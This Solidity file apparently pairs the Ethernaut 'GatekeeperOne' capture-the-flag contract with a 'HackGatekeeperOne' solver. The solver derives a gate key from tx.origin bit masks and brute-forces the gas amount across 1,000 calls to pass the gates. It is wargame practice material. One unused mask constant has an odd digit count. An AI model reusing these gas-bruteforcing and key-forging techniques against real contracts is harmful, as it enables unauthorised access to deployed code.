// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IGateKeeper {
  function enter(bytes8 _gateKey) external returns (bool);
}

contract GatekeeperOne {

  address public entrant;

  // use another contract
  modifier gateOne() {
    require(msg.sender != tx.origin);
    _;
  }

  // control gas
  modifier gateTwo() {
    require(gasleft() % 8191 == 0);
    _;
  }

  modifier gateThree(bytes8 _gateKey) {
      // uint32 === uint16 means the 16~32 bit is 0
      require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), "GatekeeperOne: invalid gateThree part one");
      // uint32 !== uint64 means the 32~64 bit is NOT 0
      require(uint32(uint64(_gateKey)) != uint64(_gateKey), "GatekeeperOne: invalid gateThree part two");
      // the tx.origin's last 16 bit is the _gateKey's last 32 bit
      require(uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)), "GatekeeperOne: invalid gateThree part three");
    _;
  }

  function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
    entrant = tx.origin;
    return true;
  }
}

contract HackGatekeeperOne {

  function getUint160TxOrigin() public view returns (uint160) {
    return uint160(tx.origin);
  }

  function getUint16TxOrigin() public view returns (uint16) {
    return uint16(uint160(tx.origin));
  }

  function getBytes8(uint16 _input) public pure returns (bytes8) {
    return bytes8(uintToBytesByAssembly(_input));
  }



  function bytes8ToUnit64(bytes8 _input) public pure returns (uint64) {
    return uint64(_input);
  }

  function bytes8ToUnit32(bytes8 _input) public pure returns (uint32) {
    return uint32(uint64(_input));
  }

  function bytes8ToUnit16(bytes8 _input) public pure returns (uint32) {
    return uint16(uint64(_input));
  }

  function uintToBytesByAbi(uint16 _input) public pure returns (bytes memory) {
    bytes memory result = abi.encodePacked(_input);
    return result;
  }

  function uintToBytesByAssembly(uint16 _input) public pure returns (bytes memory) {
    bytes memory result = new bytes(32);
    assembly {
        mstore(add(result, 32), _input)
    }
    return result;
  }

  function uint16ToBytes8(uint16 _input) public pure returns (bytes8) {
    return bytes8(uint64(_input));
  }

  // 41227 revert
  // 41228 pass
  function gasLeftCheck() public view {
      uint256 gas = gasleft();
      require(gas > 20000, 'gas is not enough');
  }

  function getGateKey1() public view returns (bytes8) {
    return bytes8(uint64(uint160(tx.origin)) & 0xffffffff0000ffff);
  }

  function getGateKey2() public view returns (bytes8) {
    return bytes8(uint64(uint160(tx.origin)) & 0x00000000f0000ffff);
  }

  // 0x8fF9d5ec0521c97f0e40735985848D24a14Ca028
  // 0x100000000000afd0
  function hackGateKeeperOne(address _gateKeeper) public returns (bool success) {
      bytes8 gateKey = getGateKey1();
      for (uint i = 0; i < 1000; i++) 
      {
        (bool sent,) = _gateKeeper.call{gas: 81910 + i}(abi.encodeWithSignature("enter(bytes8)", gateKey));
        if (sent) {
            return true;
        }
      }
      return false;
  }
}